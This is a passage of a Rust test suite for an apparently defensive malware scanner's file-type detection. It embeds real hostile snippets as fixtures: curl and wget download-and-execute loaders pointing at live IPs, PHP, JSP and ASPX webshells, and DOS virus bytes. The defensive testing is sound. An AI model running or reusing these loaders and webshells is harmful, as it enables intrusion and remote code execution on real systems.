use super::*;

#[test]
fn renamed_pep621_document_requires_structured_project_fields() {
    let data = b"[project]\nname = 'lab'\nrequires-python = '>=3.12'\ndependencies = ['impacket==0.12.0']\n";
    assert_detect("pyproject.abc123.toml", data, FileType::PyProjectToml);
    assert_detect("collected.txt", data, FileType::PyProjectToml);
    assert_detect("module.py", data, FileType::Python);
    let generic = b"[project]\nname = 'lab'\nversion = '1'\n";
    assert_ne!(
        detect(Path::new("generic.toml"), generic).map(|d| d.file_type),
        Some(FileType::PyProjectToml)
    );
    let invalid = b"[project]\nname = 'lab'\nrequires-python = '>=3.12'\ndependencies = [\n";
    assert_ne!(
        detect(Path::new("broken.toml"), invalid).map(|d| d.file_type),
        Some(FileType::PyProjectToml)
    );
}

// Helper: assert detection result
fn assert_detect(path: &str, data: &[u8], expected: FileType) {
    let Some(det) = detect(Path::new(path), data) else {
        panic!("expected {expected:?} for {path}, got None");
    };
    assert_eq!(det.file_type, expected, "wrong type for {path}");
}

fn assert_ext(path: &str, expected: FileType) {
    assert_detect(path, b"x = 1\n", expected);
}

#[test]
fn shimmer_fat_boot_sector_is_recovered_as_analyzable_data() {
    const SHIMMER: &[u8] = include_bytes!("../../testdata/dos-boot/shimmer-boot-sector.d");
    let detection = detect(Path::new("Virus.Boot-DOS.Shimmer.d"), SHIMMER)
        .expect("validated FAT boot sector should be identified");
    assert_eq!(detection.file_type, FileType::Data);
    assert_eq!(detection.source, DetectionSource::Heuristic);
    assert_eq!(detection.ext_match, ExtensionMatch::Unknown);

    // The boot signature on its own is not a file type. This preserves
    // opaque handling for arbitrary 512-byte blobs that end in 55 AA.
    let mut signature_only = [0x41u8; 512];
    signature_only[510..].copy_from_slice(&[0x55, 0xAA]);
    assert!(
        detect(Path::new("opaque.d"), &signature_only)
            .is_none_or(|d| d.file_type != FileType::Data)
    );
}

// ── Binary formats (magic bytes) ─────────────────────────────────

#[test]
fn macho_magic() {
    assert_detect(
        "binary",
        &[0xFE, 0xED, 0xFA, 0xCE, 0, 0, 0, 0],
        FileType::MachO,
    );
    assert_detect(
        "binary",
        &[0xCF, 0xFA, 0xED, 0xFE, 0, 0, 0, 0],
        FileType::MachO,
    );
    // Fat binary (nfat_arch=2, not Java class range)
    assert_detect(
        "binary",
        &[0xCA, 0xFE, 0xBA, 0xBE, 0, 0, 0, 2],
        FileType::MachO,
    );
}

#[test]
fn elf_magic() {
    assert_detect(
        "a.out",
        b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00",
        FileType::Elf,
    );
}

#[test]
fn elf_mismatch() {
    let data = b"\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    let det = detect(Path::new("malware.jpg"), data).unwrap();
    assert_eq!(det.file_type, FileType::Elf);
    assert!(det.extension_mismatch());
    assert_eq!(det.extension_type(), Some(FileType::Jpeg));
}

#[test]
fn pe_magic() {
    assert_detect("app.exe", b"MZ\x90\x00\x03\x00\x00\x00", FileType::Pe);
}

#[test]
fn pe_extension_is_consistent() {
    let det = detect(Path::new("app.exe"), b"MZ\x90\x00\x03\x00\x00\x00").unwrap();
    assert_eq!(det.file_type, FileType::Pe);
    assert!(!det.extension_mismatch());
}

#[test]
fn pe_mismatch() {
    let det = detect(Path::new("font.woff2"), b"MZ\x90\x00\x03\x00\x00\x00").unwrap();
    assert_eq!(det.file_type, FileType::Pe);
    assert!(det.extension_mismatch());
}

#[test]
fn macho_dotted_camel_case_executable_name_is_not_an_unknown_extension() {
    let data = [0xCF, 0xFA, 0xED, 0xFE, 0, 0, 0, 0];
    let det = detect(Path::new("us.zoom.ZoomDaemon"), &data).unwrap();
    assert_eq!(det.file_type, FileType::MachO);
    assert!(!det.extension_mismatch());
    assert_eq!(det.extension_type(), None);
}

#[test]
fn dotted_camel_case_script_module_name_is_not_an_unknown_extension() {
    let source = b"#!/usr/bin/env python3\nprint('ok')\n";
    let det = detect(Path::new("org.example.MyModule"), source).unwrap();
    assert_eq!(det.file_type, FileType::Python);
    assert!(!det.extension_mismatch());
    assert_eq!(det.extension_type(), None);
}

#[test]
fn macho_db_suffix_is_a_typed_data_extension_mismatch() {
    let data = [0xCF, 0xFA, 0xED, 0xFE, 0, 0, 0, 0];
    let id = FileId::from_path_and_bytes(Path::new("libpayload.db"), &data);
    assert_eq!(id.file_type(), FileType::MachO);
    assert!(id.extension_mismatch());
    assert_eq!(id.extension_mismatch_transition(), Some(("binary", "data")));
}

// ── AppleDouble (._<name>) resource forks ────────────────────────────
// Regression guard: a benign Composer tarball lit up at suspicious
// because cleave classified macOS resource forks (`._foo.php`) as PHP
// and then ran obfuscation traits over their binary bodies. Magic-byte
// detection must return Unknown so `is_program()` skips analysis.

#[test]
fn go_mod_content_beats_unknown_and_misleading_extensions() {
    let data = b"module shell_reverse_tcp\n\ngo 1.23.4\n";

    let canonical = detect(Path::new("go.mod"), data).expect("canonical Go module name");
    assert_eq!(canonical.file_type, FileType::GoMod);
    assert_eq!(canonical.source, DetectionSource::Filename);
    assert!(!canonical.extension_mismatch());

    let renamed = detect(Path::new("go.5095a2ce.mod"), data)
        .expect("Go module content should be identified without a canonical name");
    assert_eq!(renamed.file_type, FileType::GoMod);
    assert_eq!(renamed.source, DetectionSource::Heuristic);
    assert!(renamed.extension_mismatch());

    let misleading = detect(Path::new("not-a-manifest.js"), data)
        .expect("strong manifest content should beat a source extension");
    assert_eq!(misleading.file_type, FileType::GoMod);
    assert_eq!(misleading.source, DetectionSource::Heuristic);
    assert!(misleading.extension_mismatch());
}

#[test]
fn appledouble_magic_returns_unknown() {
    // AppleDouble: 00 05 16 07 + version + filler + entry table.
    // 16 bytes is enough for the magic + version slot tested below.
    let data = b"\x00\x05\x16\x07\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    let det = detect(Path::new("._foo.php"), data).unwrap();
    assert_eq!(det.file_type, FileType::Unknown);
    // Magic detection must win over the `.php` extension fallback —
    // otherwise the body gets analyzed as PHP and entropy traits fire.
    assert!(
        !det.file_type.is_program(),
        "AppleDouble bodies must be skipped by is_program() so cleave doesn't \
             analyze them; otherwise benign tarballs with macOS resource forks \
             score as suspicious"
    );
}

#[test]
fn appledouble_magic_overrides_php_extension() {
    let data = b"\x00\x05\x16\x07\x00\x02\x00\x00rest_is_binary_metadata";
    let det = detect(Path::new("wundii-flowcrafter/._index.php"), data).unwrap();
    assert_eq!(det.file_type, FileType::Unknown);
    assert_eq!(det.source, DetectionSource::Magic);
}

#[test]
fn null_byte_without_appledouble_magic_does_not_match() {
    // Negative: a file that starts with 0x00 but isn't AppleDouble
    // (e.g. raw padded data) must not be misclassified as Unknown via
    // this path. Falls through to extension/heuristic detection.
    let data = b"\x00\x00\x00\x00more null bytes here";
    let det = detect(Path::new("padding.dat"), data);
    // .dat extension maps to Data; the 0x00 arm must not have intercepted.
    assert!(
        det.is_none() || det.unwrap().file_type != FileType::Unknown,
        "unrelated 0x00-leading bytes must not be claimed as AppleDouble"
    );
}

// ── Java ─────────────────────────────────────────────────────────

#[test]
fn java_class_magic() {
    assert_detect(
        "Main.class",
        &[0xCA, 0xFE, 0xBA, 0xBE, 0, 0, 0, 52],
        FileType::JavaClass,
    );
}

/// `.class` and `.dex` are defined by their magic. A name with no magic
/// behind it is not the format; the body decides.
#[test]
fn magic_defined_names_need_their_magic() {
    assert_detect("Foo.class", b"x = 1\n", FileType::Text);
    assert_detect("classes.dex", b"x = 1\n", FileType::Text);
    assert_detect(
        "Exploit.JS.RealPlr.ko",
        b"<html><body><script>var a=1;</script></body></html>\n",
        FileType::Html,
    );
}

#[test]
fn java_source_by_ext() {
    assert_ext("Foo.java", FileType::Java);
}

#[test]
fn jar_pk_magic() {
    assert_detect("lib.jar", b"PK\x03\x04jar content", FileType::Jar);
}

#[test]
fn jar_by_ext() {
    assert_detect("lib.war", b"PK\x03\x04war content", FileType::Jar);
}

#[test]
fn xpi_by_ext_routes_to_xpi_not_zip() {
    // ZIP magic + .xpi extension → FileType::Xpi (distinct from generic Zip).
    assert_detect("addon.xpi", b"PK\x03\x04xpi content", FileType::Xpi);
}

#[test]
fn xpi_classified_as_archive() {
    assert!(FileType::Xpi.is_archive());
}

#[test]
fn whl_by_ext_routes_to_whl_not_zip() {
    assert_detect(
        "pkg-1.0-py3-none-any.whl",
        b"PK\x03\x04wheel content",
        FileType::Whl,
    );
}

#[test]
fn whl_classified_as_archive() {
    assert!(FileType::Whl.is_archive());
}

#[test]
fn opc_package_archives_do_not_route_to_ooxml() {
    let data = b"PK\x03\x04[Content_Types].xml";
    for name in [
        "app.msix",
        "app.appx",
        "bundle.msixbundle",
        "bundle.appxbundle",
        "comic.cbz",
    ] {
        assert_detect(name, data, FileType::Zip);
    }
}

// ── Python ───────────────────────────────────────────────────────

#[test]
fn python_by_ext() {
    assert_ext("script.py", FileType::Python);
}

#[test]
fn python_by_shebang() {
    assert_detect(
        "mystery",
        b"#!/usr/bin/env python3\nimport sys\n",
        FileType::Python,
    );
}

#[test]
fn python_by_import_heuristic_without_filename() {
    assert_detect(
        "mystery",
        b"import os, subprocess, tempfile, base64; exec(base64.b64decode('cHJpbnQoMSk='))\n",
        FileType::Python,
    );
}

#[test]
fn python_bytecode_magic() {
    assert_detect(
        "mod.pyc",
        &[0x42, 0x0D, 0x0D, 0x0A, 0, 0, 0, 0],
        FileType::PythonBytecode,
    );
}

#[test]
fn python_bytecode_by_ext() {
    assert_ext("mod.pyc", FileType::PythonBytecode);
}

// ── JavaScript / TypeScript ──────────────────────────────────────

#[test]
fn javascript_by_ext() {
    assert_ext("app.js", FileType::JavaScript);
    assert_ext("app.mjs", FileType::JavaScript);
    assert_ext("app.cjs", FileType::JavaScript);
    assert_ext("app.jsx", FileType::JavaScript);
}

#[test]
fn javascript_by_shebang() {
    assert_detect(
        "tool",
        b"#!/usr/bin/env node\nconsole.log('hi');\n",
        FileType::JavaScript,
    );
}

#[test]
fn javascript_runtime_shebang_on_typescript_stays_typescript() {
    for shebang in [
        "#!/usr/bin/env node",
        "#!/usr/bin/env -S deno run",
        "#!/usr/bin/env bun",
    ] {
        let data = format!("{shebang}\nconst x: number = 1;\n");
        let det = detect(Path::new("cli.ts"), data.as_bytes()).unwrap();
        assert_eq!(det.file_type, FileType::TypeScript, "{shebang}");
        assert_eq!(det.source, DetectionSource::Shebang, "{shebang}");
        assert!(!det.extension_mismatch(), "{shebang}");
    }
    // Without the extension, the runtime is all there is to go on.
    assert_detect(
        "cli",
        b"#!/usr/bin/env node\nconst x = 1;\n",
        FileType::JavaScript,
    );
}

#[test]
fn typescript_by_ext() {
    assert_ext("app.ts", FileType::TypeScript);
    assert_ext("app.tsx", FileType::TypeScript);
}

// ── Shell ────────────────────────────────────────────────────────

#[test]
fn shell_by_ext() {
    assert_ext("run.sh", FileType::Shell);
    assert_ext("run.bash", FileType::Shell);
    assert_ext("run.zsh", FileType::Shell);
}

#[test]
fn shell_by_shebang() {
    assert_detect("mystery", b"#!/bin/bash\necho hello\n", FileType::Shell);
    assert_detect("mystery", b"#!/bin/sh\necho hello\n", FileType::Shell);
    assert_detect(
        "mystery",
        b"#!/usr/bin/env zsh\necho hello\n",
        FileType::Shell,
    );
}

#[test]
fn script_extension_overrides_shell_shebang_juke() {
    // .py with a bash shebang: the shebang is a static-analysis-evasion
    // juke, the extension is what the user/loader treats the file as.
    // Trust the extension; flag the mismatch.
    let det = detect(Path::new("script.py"), b"#!/bin/bash\necho hello\n").unwrap();
    assert_eq!(det.file_type, FileType::Python);
    assert!(det.extension_mismatch());
    assert_eq!(det.extension_type(), Some(FileType::Python));
    assert_eq!(det.shebang_type(), Some(FileType::Shell));
}

#[test]
fn js_extension_overrides_bash_shebang_juke() {
    // npm xmlrpc / xmrdropper pattern.
    let det = detect(
        Path::new("validator.js"),
        b"#!/bin/bash\nconst fs = require('fs');\n",
    )
    .unwrap();
    assert_eq!(det.file_type, FileType::JavaScript);
    assert!(det.extension_mismatch());
    assert_eq!(det.extension_type(), Some(FileType::JavaScript));
    assert_eq!(det.shebang_type(), Some(FileType::Shell));
}

#[test]
fn shebang_juke_reports_the_extension_type() {
    // `mismatch_ext_type` names what the extension implied, as for every other
    // mismatch; the shebang's claim is not the extension's.
    let id = FileId::from_path_and_bytes(
        Path::new("juke.js"),
        b"#!/bin/bash
echo hi
",
    );
    assert_eq!(id.file_type(), FileType::JavaScript);
    assert_eq!(id.source(), DetectionSource::ExtensionOverridesShebang);
    assert!(id.extension_mismatch());
    let json = serde_json::to_value(id).unwrap();
    assert_eq!(json["extension_mismatch"], true);
    assert_eq!(json["mismatch_ext_type"], "javascript");
}

#[test]
fn padded_batch_line_does_not_grow_the_stack() {
    // Each leading `(` used to recurse once; a megabyte of them overflowed
    // even a main-thread stack, an abort no `catch_unwind` can stop.
    let data = vec![b'('; 1 << 20];
    let id = std::thread::Builder::new()
        .stack_size(256 * 1024)
        .spawn(move || FileId::from_path_and_bytes(Path::new("pb"), &data))
        .unwrap()
        .join()
        .unwrap();
    assert_ne!(id.source(), DetectionSource::Failed);
}

#[test]
fn protobuf_schema_extension_prevents_kotlin_heuristic() {
    let data = br#"syntax = "proto3";

package c2;

service C2Service {
  rpc BeaconStream(stream BeaconMessage) returns (stream CommandMessage);
  rpc SendCommand(SendCommandRequest) returns (SendCommandResponse);
}

message CommandMessage {
  string command_id = 1;
  string command = 2;
  repeated string args = 3;
}
"#;
    let det = detect(Path::new("c2.proto"), data).unwrap();
    assert_eq!(det.file_type, FileType::Text);
    assert!(!det.extension_mismatch());
}

#[test]
fn shell_extension_with_shell_shebang_no_juke() {
    // .sh with bash shebang: not a juke, no override.
    let det = detect(Path::new("script.sh"), b"#!/bin/bash\necho hello\n").unwrap();
    assert_eq!(det.file_type, FileType::Shell);
    assert!(!det.extension_mismatch());
}

#[test]
fn shell_one_liner_without_shebang_or_ext() {
    assert_detect(
        "Sifuvuziw",
        b"cd $TMPDIR && curl -O http://144.31.236.51/Dynamic && xattr -c ./Dynamic && chmod +x ./Dynamic && ./Dynamic\n",
        FileType::Shell,
    );
}

#[test]
fn shell_multarch_wget_loader_without_shebang_or_ext() {
    let data = b"cd /tmp || /var/tmp; rm avtech.arm5; wget http://193.243.147.115/avtech.arm5; chmod 777 avtech.arm5; ./avtech.arm5\n\
cd /tmp || /var/tmp; rm avtech.arm7; wget http://193.243.147.115/avtech.arm7; chmod 777 avtech.arm7; ./avtech.arm7\n";
    assert_detect("avTECH", data, FileType::Shell);
}

#[test]
fn shell_empty_falls_back_to_ext() {
    let det = detect(Path::new("run.sh"), b"").unwrap();
    assert_eq!(det.file_type, FileType::Shell);
    assert_eq!(det.source, DetectionSource::Extension);
}

// ── Batch ────────────────────────────────────────────────────────

#[test]
fn batch_by_ext() {
    assert_ext("run.bat", FileType::Batch);
    assert_ext("run.cmd", FileType::Batch);
}

// ── JCL ──────────────────────────────────────────────────────────

#[test]
fn jcl_by_ext() {
    assert_ext("run.jcl", FileType::Jcl);
}

// ── VBScript ─────────────────────────────────────────────────────

#[test]
fn vbs_by_ext() {
    assert_ext("script.vbs", FileType::Vbs);
    assert_ext("script.vbe", FileType::Vbs);
    assert_ext("script.wsf", FileType::Vbs);
}

// ── Go / Rust / Swift / Objective-C / Zig / Elixir ──────────────

#[test]
fn go_by_ext() {
    assert_ext("main.go", FileType::Go);
}

#[test]
fn rust_by_ext() {
    assert_ext("lib.rs", FileType::Rust);
}

#[test]
fn swift_by_ext() {
    assert_ext("app.swift", FileType::Swift);
}

#[test]
fn objc_by_ext() {
    // Plain C is Objective-C too; with no directive to score, C statement
    // structure keeps the name.
    let c = b"extern void GoFunc();\nint main(int argc, char **argv) {\n\tGoFunc();\n}\n";
    assert_detect("view.m", c, FileType::ObjectiveC);
    assert_detect("view.mm", c, FileType::ObjectiveC);
}

/// A `.m` of many `#include` lines scores heavily for C, and a couple of
/// directives still make it Objective-C.
#[test]
fn objc_directives_beat_c_includes() {
    let mut src = b"#include <stdio.h>\n".repeat(12);
    src.extend_from_slice(b"#import <Foundation/Foundation.h>\n@interface Foo : NSObject\n@end\n");
    assert_detect("Foo.mm", &src, FileType::ObjectiveC);
}

/// Text with neither a directive nor C structure is not Objective-C
/// because of its last letter: a MATLAB script, a hosts file.
#[test]
fn m_without_objc_or_c_structure_is_text() {
    assert_detect(
        "genherm.m",
        b"% Hermite points\nx = linspace(0, 1, 10)\ndisp(x)\n",
        FileType::Text,
    );
    assert_detect(
        "Trojan.Win32.Qhost.m",
        b"127.0.0.1 ruworld.com\r\n127.0.0.1 example.net\r\n",
        FileType::Text,
    );
}

/// A batch file under a Perl test name. Perl's `.t` has nothing to say
/// against `@echo off` when the body carries no Perl at all.
#[test]
fn batch_body_contradicts_perl_extension() {
    assert_detect(
        "Trojan.BAT.Looper.t",
        b"@echo off\r\n:loop\r\ngoto loop\r\n",
        FileType::Batch,
    );
    assert_detect(
        "Virus.BAT.Silly.m",
        b"if \"%1==\" for %%i in (*.b*) do call %0 %%i\r\n",
        FileType::Batch,
    );
}

/// `start WScript.exe x.vbs` is a batch line launching the host.
#[test]
fn wscript_exe_is_not_vbscript() {
    let bat = b"@echo off\r\nif exist sys32.vbs start WScript.exe sys32.vbs&exit\r\nif exist a.vbs start WScript.exe a.vbs&exit\r\n";
    assert_detect("Worm.VBS.Autorun.m", bat, FileType::Batch);
}

/// mIRC handlers at any level and for any event, and mIRC's saved-script INI.
#[test]
fn mirc_event_headers_and_saved_script() {
    assert_detect(
        "Backdoor.IRC.Cloner.m",
        b"on 10:TEXT:*:*:{\n  if ($1 == !quit) { /quit }\n}\n",
        FileType::Mirc,
    );
    assert_detect(
        "Backdoor.IRC.CWSBD",
        b"on *:start: {\n  socklisten door 37173\n}\n",
        FileType::Mirc,
    );
    assert_detect(
        "IRC-Worm.IRC.TooLame.a",
        b"[script]\r\nn0=on 1:LOAD: { .ial on }\r\nn1=on 1:UNLOAD: { .quit }\r\n",
        FileType::Mirc,
    );
    // A VBScript that writes a mIRC script quotes the header mid-line.
    assert_detect(
        "Email-Worm.VBS.LoveLetter.bb",
        b"On Error Resume Next\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nscriptini.WriteLine \"n0=on 1:JOIN:#:{\"\nWScript.Echo 1\n",
        FileType::Vbs,
    );
}

/// An alias file written with mIRC identifiers is mIRC even when it
/// writes batch lines into the file it drops.
#[test]
fn mirc_alias_file_is_mirc_not_batch() {
    let src = b"alias xspread {\r\n  .write x-.bat net view > x-.txt\r\n  .write x-.bat @echo off\r\n  .timersx 1 20 xcopy1\r\n}\r\nalias xcopy1 {\r\n  if ($lines(x-.txt) < 6) { halt }\r\n}\r\n";
    assert_detect("Trojan.IRC.Nullpy.a", src, FileType::Mirc);
    // ircII shares the brace form, but not mIRC's identifiers.
    assert_ne!(
        detect(Path::new("x.irc"), b"alias hi {\n  echo hello\n}\n").map(|d| d.file_type),
        Some(FileType::Mirc)
    );
}

/// A 27-byte COM infector is too short for the percentage alone, and a
/// zero-filled header is NUL in both lanes -- not UTF-16 text.
#[test]
fn short_and_nul_padded_binaries_are_not_source() {
    let com = [
        0xb4, 0x4e, 0xba, 0x10, 0x01, 0xcd, 0x21, 0xb4, 0x3c, 0xba, 0x9e, 0x00, 0xcd, 0x21, 0xb2,
        0x1b, 0x2a, 0x2e, 0x43, 0x4f, 0x4d, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf1,
    ];
    assert_detect("Virus.DOS.Trivial.27.m", &com, FileType::DosCom);
    let mut jet = vec![0x00u8, 0x01, 0x00, 0x00];
    jet.extend_from_slice(b"Standard Jet DB\0");
    jet.resize(2048, 0);
    assert_detect("Virus.MSAccess.Poison.c", &jet, FileType::Data);
}

#[test]
fn markdown_named_javascript_is_javascript() {
    let js = b"const _0x5789f0=_0x14df;(function(_0x27cbc2,_0x20e97b){\n\
const fs=require('fs');\nfunction loadAsar(){return require('asar');}\n\
function loadBytenode(){return require('bytenode');}\n})();\n";
    assert_detect("CHANGELOG.md", js, FileType::JavaScript);
    let readme = b"# Notes\n\nInstall with `npm install foo`.\n\nSee the docs.\n";
    assert_detect("README.md", readme, FileType::Markdown);
}

#[test]
fn txt_php_webshell_overrides_text_extension() {
    let php = b"<?\n$cmd = stripslashes($cmd);\nsystem($cmd);\n";
    assert_detect("Php_Backdoor.txt", php, FileType::Php);
    // The saved webshell also embeds `document.write`, which used to tie
    // JavaScript inside the sniff window.
    let saved = include_bytes!("testdata/php-backdoor.txt");
    assert_detect("Php_Backdoor.txt", saved, FileType::Php);
}

#[test]
fn jsp_page_directive_is_jsp() {
    let bom = b"\xef\xbb\xbf<%@page pageEncoding=\"utf-8\"%>\n<%@page import=\"java.io.*\"%>\n<%!\nString pw = \"x\";\n%>\n";
    assert_detect("date.jsp.txt", bom, FileType::Jsp);
    let spaced = b"<%@ page language=\"java\" contentType=\"text/html\"%>\n<% out.println(1); %>\n";
    assert_detect("page.jsp", spaced, FileType::Jsp);
    // An HTML prologue does not change what a `.jsp` is.
    assert_detect("page.jsp", b"<html><body>hi</body></html>", FileType::Jsp);
    // A Java source file that quotes a directive stays Java.
    assert_detect(
        "App.java",
        b"<%@page pageEncoding=\"utf-8\"%>\nclass App {}\n",
        FileType::Java,
    );
    // A saved browser copy opens with a doctype. The page directive a few
    // lines later is still the type.
    let saved = b"<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0 Transitional//EN\">\n\
<HTML><HEAD><TITLE>shell</TITLE></HEAD>\n\
<%@ page contentType=\"text/html; charset=GBK\" %>\n\
<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>\n";
    assert_detect("shell.jsp.txt", saved, FileType::Jsp);
    assert_detect(
        "base64.jspx.txt",
        b"<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\" version=\"2.0\">\n\
<jsp:scriptlet>String s;</jsp:scriptlet>\n</jsp:root>\n",
        FileType::Jsp,
    );
    assert_detect(
        "App.java",
        b"<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\">\nclass App {}\n",
        FileType::Java,
    );
    assert_detect(
        "page.html",
        b"<!DOCTYPE html>\n<html><body>hi</body></html>\n",
        FileType::Html,
    );
}

#[test]
fn asp_directive_is_asp() {
    let classic = b"<%@ Language=VBScript %>\n<%\nFunction Foo()\nEnd Function\n%>\n";
    assert_detect("aspydrv.asp.txt", classic, FileType::Asp);
    let aspx = b"<%@ Page Language=\"C#\" %>\n<script runat=\"server\">\n</script>\n";
    assert_detect("shell.aspx", aspx, FileType::Asp);
    assert_detect("renamed.txt", aspx, FileType::Asp);
    let jscript_aspx = b"<%@Page Language=\"Jscript\"%>\n<%eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item['x'])));%>\n";
    assert_detect("shell.aspx", jscript_aspx, FileType::Asp);
    assert_detect("payload.unknown", jscript_aspx, FileType::Asp);
}

#[test]
fn ace_jsp_snippets_are_javascript_not_jsp() {
    let snippets = b"define(\"ace/snippets/jsp\",[\"require\",\"exports\",\"module\"],function(require,exports,module){\nexports.snippetText = \"<%@page contentType=\\\"text/html\\\"%>\\n\";\n});\n";
    assert_detect("jsp.js", snippets, FileType::JavaScript);
    assert_detect("snippet.unknown", snippets, FileType::JavaScript);
}

#[test]
fn coldfusion_tex_yara_postscript_and_irc_scripts() {
    assert_detect("p.cfm", b"<cfset x = 1>\n", FileType::Cfml);
    assert_detect("p.txt", b"<cfoutput>#x#</cfoutput>\n", FileType::Cfml);
    assert_detect("a.tex", b"hello\n", FileType::Tex);
    assert_detect("notes.txt", b"\\documentclass{article}\n", FileType::Tex);
    // `.cls` is also Visual Basic. The body decides.
    assert_detect("article.cls", b"\\ProvidesClass{article}\n", FileType::Tex);
    let vb_cls = detect(Path::new("Module.cls"), b"VERSION 1.0 CLASS\n");
    assert_ne!(vb_cls.map(|d| d.file_type), Some(FileType::Tex));
    let yara = b"rule Demo {\nstrings:\n$a = \"x\"\ncondition:\ntrue\n}\n";
    assert_detect("r.yar", yara, FileType::Yara);
    assert_detect("rules.txt", yara, FileType::Yara);
    assert_detect("doc.ps", b"%!PS-Adobe-3.0\n", FileType::PostScript);
    assert_detect("bare.ps", b"not a header\n", FileType::PostScript);
    assert_detect("bot.mrc", b"alias x echo hi\n", FileType::Mirc);
    assert_detect("shell.m", b"on *:TEXT:*:echo hi\n", FileType::Mirc);
    assert_detect("shell.lua", b"ON 1:JOIN:*:{\n}\n", FileType::Mirc);
    assert_detect("hooks.ircii", b"alias x echo hi\n", FileType::IrcII);
    assert_detect("rc.txt", b"^on ^join \"*\" {\n}\n", FileType::IrcII);
}

#[test]
fn prose_txt_stays_text() {
    let note = b"This is a note about the meeting. We should let the team decide next week.\n";
    assert_detect("notes.txt", note, FileType::Text);
    let license = b"Modified Version, except to acknowledge the contribution.\n\
Original or Modified Versions may be sold by itself.\n";
    assert_detect("OFL.txt", license, FileType::Text);
    let guide = b"If you discover a problem, post a message and let the rest of us know.\n\
Coordinate with the Applet Maintainer before sweeping changes.\n";
    assert_detect("contributing.txt", guide, FileType::Text);
}

#[test]
fn php4_agent_without_known_extension_is_php() {
    let php = b"<?\nclass backdoor {\n  var $pwd;\n  var $shell;\n  function shell() {\n    echo $_SERVER['PHP_SELF'];\n  }\n}\n";
    assert_detect("Backdoor.PHP.Agent.ap", php, FileType::Php);
}

#[test]
fn php_webshell_with_bb_extension_is_php() {
    let php = b"<?\n@$output = system($_POST['command']);\n";
    assert_detect("Backdoor.PHP.Agent.bb", php, FileType::Php);
}

#[test]
fn babashka_script_keeps_bb_extension() {
    let bb = b"(defn main []\n  (println \"hi\"))\n";
    assert_detect("script.bb", bb, FileType::Clojure);
}

#[test]
fn perl_source_with_m_extension_is_perl() {
    let perl = b"use strict;\nmy $port = 6667;\nprint $sock \"NICK $nick\\r\\n\";\n";
    assert_detect("Scanner.m", perl, FileType::Perl);
}

#[test]
fn objective_c_source_keeps_m_extension() {
    let objc =
        b"#import <Foundation/Foundation.h>\n@interface View : NSObject\n- (void)draw;\n@end\n";
    assert_detect("View.m", objc, FileType::ObjectiveC);
}

#[test]
fn dos_com_with_source_extension_is_data() {
    let mut com = vec![0x90u8; 80];
    for i in (0..80).step_by(8) {
        com[i] = 0x01;
    }
    com[10..14].copy_from_slice(&[0xB4, 0x4C, 0xCD, 0x21]);
    assert_detect("Burger.m", &com, FileType::DosCom);
    assert_detect("Trivial.45.t", &com, FileType::DosCom);
    assert_detect("prog.com", &com, FileType::DosCom);
    assert_detect("prog.com", b"MZ\x90\x00", FileType::Pe);
}

/// Corpora name samples by hash or give them a generic data suffix, so a
/// COM program there has no `.com`. It was Unknown / Data, which no DOS
/// rule walks.
#[test]
fn dos_com_without_a_telling_name_is_dos_com() {
    let mut com = vec![0x90u8; 80];
    for i in (0..80).step_by(8) {
        com[i] = 0x01;
    }
    com[10..14].copy_from_slice(&[0xB4, 0x4C, 0xCD, 0x21]);
    assert_detect(
        "0f3a9c1e2b7d4f6a8e5c3b1a9d7f5e3c1b9a7d5f3e1c9b7a5d3f1e9c7b5a3d1f",
        &com,
        FileType::DosCom,
    );
    assert_detect("prog", &com, FileType::DosCom);
    assert_detect("prog.bin", &com, FileType::DosCom);
}

#[test]
fn padded_anton_overwriter_is_recovered_as_dos_com() {
    const ANTON: &[u8] = include_bytes!("../../testdata/dos-com/anton-97");
    let detection = detect(Path::new("Virus.DOS.Trivial.Anton.97"), ANTON)
        .expect("DOS overwriter execution shape should identify the opaque sample");
    assert_eq!(detection.file_type, FileType::DosCom);
    assert_eq!(detection.source, DetectionSource::Heuristic);
    assert_eq!(detection.ext_match, ExtensionMatch::Consistent);

    // A lone interrupt and a COM-like string are too weak without the
    // repeated DOS-call and termination shape.
    let mut ordinary_data = vec![0u8; 5120];
    ordinary_data[..6].copy_from_slice(b"*.COM\0");
    ordinary_data[16..18].copy_from_slice(&[0xCD, 0x21]);
    ordinary_data[32..34].copy_from_slice(&[0xCD, 0x20]);
    assert!(
        detect(Path::new("opaque.97"), &ordinary_data)
            .is_none_or(|d| d.file_type != FileType::DosCom)
    );
}

/// Opaque bytes after a call/pop GetPC stub: the shape of a carved,
/// encoded stage. Unknown before, so no rule could reach it.
fn call_pop_blob() -> Vec<u8> {
    let mut state = 0x2545_F491u32;
    let mut blob: Vec<u8> = (0..512)
        .map(|_| {
            state = state.wrapping_mul(1_103_515_245).wrapping_add(12_345);
            (state >> 24) as u8
        })
        .collect();
    blob[..5].copy_from_slice(&[0xE8, 0xFB, 0x01, 0, 0]); // call → 0x200
    blob.resize(0x210, 0);
    blob[0x200] = 0x5A; // pop edx
    blob
}

#[test]
fn headerless_shellcode_is_shellcode() {
    let sc = call_pop_blob();
    for name in [
        "agent.bin.sgn",
        "prog",
        "stage.bin",
        "payload.dat",
        "a.exe",
        "x.c",
    ] {
        assert_detect(name, &sc, FileType::Shellcode);
    }
    assert_eq!(FileId::from_bytes(&sc).file_type(), FileType::Shellcode);
    assert_eq!(FileType::from_label("shellcode"), Some(FileType::Shellcode));
    assert!(FileType::Shellcode.is_binary());
}

#[test]
fn known_formats_beat_shellcode() {
    let mut pe = call_pop_blob();
    pe[..2].copy_from_slice(b"MZ");
    assert_ne!(
        detect(Path::new("a.bin"), &pe).map(|d| d.file_type),
        Some(FileType::Shellcode)
    );
    // Without the stub's pop, it stays what it was.
    let mut data = call_pop_blob();
    data[0x200] = 0x90;
    assert!(detect(Path::new("blob"), &data).is_none_or(|d| d.file_type != FileType::Shellcode));
}

#[test]
fn kotlin_native_metadata_with_incidental_int21_is_data() {
    let mut knf = vec![0u8; 0x520];
    knf[..4].copy_from_slice(&[0x00, 0x00, 0x00, 0x01]);
